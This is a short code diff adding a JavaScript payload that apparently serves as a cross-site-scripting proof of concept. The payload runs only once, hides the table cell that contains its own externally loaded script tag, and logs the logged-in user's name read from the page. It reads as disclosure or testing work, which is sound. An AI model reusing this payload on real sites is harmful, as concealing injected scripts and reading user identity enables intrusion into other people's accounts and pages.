@@ -1,1 +1,8 @@
+if (document.querySelectorAll('a#flag').length == 0)
+{
+let flag = document.createElement('a');
+flag.setAttribute("id","flag");
+document.head.appendChild(flag);
+document.querySelector('script[src="HTTPS://AX16.GITHUB.IO/POC"]').closest('td').style="display: none";
 console.log(document.querySelector('#prihlasen').textContent.split(':')[1].trim())
+}
